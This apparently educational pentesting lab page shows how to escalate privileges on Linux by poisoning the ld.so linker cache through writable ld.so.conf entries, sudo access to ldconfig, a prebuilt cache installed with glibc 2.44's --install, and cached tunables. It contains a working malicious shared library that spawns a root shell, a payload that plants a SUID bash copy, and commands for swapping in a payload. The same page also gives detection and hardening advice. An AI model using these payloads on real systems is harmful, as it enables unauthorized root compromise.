# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

This page is a focused lab for poisoning the **system linker cache through `/etc/ld.so.conf` or `ldconfig`**. For missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD`, and other generic SUID linker abuse, see [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Prepare the environment

In the following section you can find the code of the files we are going to use to prepare the environment

{{#tabs}}
{{#tab name="sharedvuln.c"}}

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```

{{#endtab}}

{{#tab name="libcustom.h"}}

```c
#include <stdio.h>

void vuln_func();
```

{{#endtab}}

{{#tab name="libcustom.c"}}

```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```

{{#endtab}}
{{#endtabs}}

1. **Create** those files in your machine in the same folder
2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` to `/usr/lib` and refresh the cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.

```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

### Useful triage commands

When attacking a real target, verify the **exact library name** the binary needs, what the loader is **currently resolving**, and which configured paths are writable without mutating the live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```

Use `ldd` only on a **trusted** executable. Some implementations or unusual ELF interpreters can cause it to execute attacker-controlled code; `objdump -p ./file | grep NEEDED` safely lists direct dependencies. For a trusted target, invoking the discovered interpreter with `--list` shows actual resolution. Compare that output with `--inhibit-cache --list`: a difference proves that `/etc/ld.so.cache`, rather than an ordinary search-path rule, selected the object.<sup>[[1]](#references)[[4]](#references)</sup>

A couple of useful gotchas:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` usually **doesn't work** because
  the redirection is done by your current shell. Use
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` instead.
- **SUID/privileged** binaries run in **secure-execution mode**: `LD_LIBRARY_PATH`
  is ignored, while `LD_PRELOAD` is restricted (slash-containing names are
  ignored, and only setuid-marked libraries in standard directories may be
  preloaded). Once root runs `ldconfig`, directories listed in
  `/etc/ld.so.conf` can enter `/etc/ld.so.cache`, so this misconfiguration can
  still affect privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` is also ignored in secure-execution mode unless `/etc/suid-debug` exists, so collect its trace from an equivalent non-SUID run rather than expecting output from the privileged execution.<sup>[[1]](#references)</sup>
- On glibc 2.33 and newer, the dynamic loader also exposes
  `--list-diagnostics`, which prints machine-readable loader diagnostics and
  built-in search-path information when a hijack doesn't behave as expected.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache and SONAME constraints

`ldconfig` does not cache every arbitrary file in a configured directory: it examines ELF headers, recognizes names matching `lib*.so*` or `ld-*.so*`, and expects the conventional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain. The injected object must therefore have the target architecture/class, the exact `DT_NEEDED` name (normally its `DT_SONAME`), and any symbols/versions the victim resolves.<sup>[[2]](#references)</sup>

```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```

Prefer a target-specific library such as this example. Shadowing a common SONAME with an incomplete object can break every process that resolves it before the intended privileged target runs.<sup>[[3]](#references)</sup>

### Cached-path persistence and atomic swaps

The cache records a **library name to pathname** mapping; it does not embed the shared object. After an attacker-controlled pathname is cached, replacing the object at that exact path affects newly started processes without another `ldconfig` run. This enables a useful time-of-check/time-of-use pattern: expose a valid library during an administrator's cache rebuild or inspection, then atomically rename the payload over it. Existing processes keep their already mapped object.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```

Likewise, deleting the malicious line from `ld.so.conf` does not evict an already written entry by itself: the administrator must remove the untrusted object, fix ownership/write access, and rebuild the cache. Use the `--inhibit-cache` comparison above to distinguish a stale cache entry from a still-active configuration path.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

In this scenario, suppose an administrator has added a vulnerable entry to a
file under `/etc/ld.so.conf.d/` that is included by the system's
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```

The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
**Download and compile** the following code inside that path:

```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
    setgid(0);
    setuid(0);
    puts("I'm the bad library");
    system("/bin/sh");
}
```

If you expect **root** (or another privileged account) to execute the vulnerable binary later, it is usually better to leave a **root-owned artifact** instead of spawning an interactive shell. For example:

```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```

Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.

Now that we have **created the malicious libcustom library inside the misconfigured** path, the default cache must be rebuilt by a successful privileged **`ldconfig`** run. A reboot helps only where the local boot process actually invokes it; otherwise wait for an administrator action or use an unsafe sudo rule if one is available.<sup>[[2]](#references)</sup>

Once this has happened **recheck** where the `sharedvuln` executable is loading the `libcustom.so` library from:

```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

> [!TIP]
> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.

### Modern `glibc-hwcaps` shadowing

Since glibc 2.33, the loader can prefer optimized libraries below `glibc-hwcaps/<level>/` inside **every library search directory**. Consequently, checking only `/home/ubuntu/lib` is insufficient: a writable compatible subdirectory such as `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` can shadow the base library after `ldconfig` indexes it, while other CPUs keep using the base object. This also provides an architecture-selective hijack that can be missed when validation occurs on a different CPU.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
  -o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```

The current glibc hardening guidance recommends avoiding duplicate SONAMEs, non-default search locations, and objects in `glibc-hwcaps` subdirectories. From an audit perspective, apply ownership and writeability checks recursively to configured directories and their parent path components.<sup>[[3]](#references)</sup>

### Other misconfigurations - Same vuln

In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
But there are other misconfigurations that can cause the same vulnerability: if you have **write permissions** in a loaded **config file**, can create a file in a writable `/etc/ld.so.conf.d/` directory, or can write to `/etc/ld.so.conf`, you can configure and exploit the same vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Suppose you have sudo privileges over `ldconfig`**. `ldconfig` accepts scan directories as positional arguments, so the shortest cache-poisoning form is often simply:<sup>[[2]](#references)</sup>

```bash
sudo ldconfig /tmp
```

Alternatively, `-f` selects another configuration file while retaining the default cache output. This is useful when an argument filter blocks positional directories but still permits `-f`, or when several paths must be injected:<sup>[[2]](#references)</sup>

```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
And finally, lets load the path and check where is the binary loading the library from:

```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.** The option details matter when assessing a constrained sudo rule: `-f` selects another configuration but still rebuilds `/etc/ld.so.cache`; `-C` redirects the cache elsewhere; `-N` prevents cache rebuilding; and `-X` prevents link updates but **still rebuilds the cache unless combined with `-N`**. `-n` implies `-N`, so it can update links in supplied directories but cannot poison the cache; `-r` operates below an alternate root and normally does not change the host cache.<sup>[[2]](#references)</sup>

### glibc 2.44: installing a prebuilt cache

Glibc 2.44 added `ldconfig --install SOURCE`, which atomically copies a prebuilt cache to the selected cache destination (the host `/etc/ld.so.cache` unless `-C` or `-r` changes it). This creates another dangerous argument for sudoers rules and privileged wrappers: an attacker can construct a valid cache **without privileges**, then use the permitted `--install` invocation to replace the system cache. The install path checks the cache magic but does not regenerate its entries from trusted configuration.<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
  -C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```

The cache still contains **pathnames**, not library bytes, so `/tmp/libcustom.so` must remain present and compatible when the victim starts. Filters that merely reject `-f`, positional directories, or `-t` are therefore incomplete on glibc 2.44: reject `--install`/`-I` too, or preferably do not delegate `ldconfig` at all.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached system-wide tunables

Starting with glibc 2.44, `ldconfig` also parses `/etc/tunables.conf` and stores its settings as an extension in `/etc/ld.so.cache`. The file accepts `include` directives and per-process filters. Prefixes control scope: `@`/`onlysecure` targets only `AT_SECURE` processes, `$`/`nonsecure` excludes them, and `*`/`anysecure` covers both. **An unprefixed entry defaults to non-secure processes**, so an attacker must explicitly use `@` or `*` to influence setuid, setgid, or capability-elevated programs. This expands the audit boundary beyond library directories: writable tunables configuration or an included file can influence future program startups after a privileged cache rebuild.<sup>[[7]](#references)[[9]](#references)</sup>

The same release adds `ldconfig -t TUNCONF`, which selects an alternate tunables file while still writing the normal cache unless another option changes it. Therefore, wrappers and sudo rules that attempted to block only `-f` must also reject `-t`, arbitrary positional directories, `--install`, and cache-output manipulation.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>

```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```

### Target-selective tunables

The `[proc:PATTERN]` filter applies the following entries only when the executable's full `/proc/self/exe` path (if `PATTERN` starts with `/`) or basename matches. A filter ends at the next filter, `[]`, the end of the file, or an include-file boundary. This makes a poisoned cache less noisy because the altered behavior can be restricted to one privileged victim.<sup>[[7]](#references)</sup>

```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```

The `-`/`nonoverridable` prefix prevents `GLIBC_TUNABLES` from overriding a cached value; `+`/`overridable` restores the normal override behavior. For `AT_SECURE` processes the environment variable is ignored entirely anyway. Treat the file format as version-specific—the glibc project does not promise it as a stable interface—and enumerate supported names and values with `"$interp" --list-tunables` before attempting a targeted effect.<sup>[[7]](#references)[[9]](#references)</sup>

This is not automatically arbitrary code execution. It is a privileged **loader-behavior manipulation** primitive: glibc explicitly warns that system-wide values can apply security-sensitive tunables to setuid/setgid programs without per-tunable security screening. Look for target-specific allocator changes, CPU-hardening changes, or denial-of-service conditions rather than assuming a universal payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
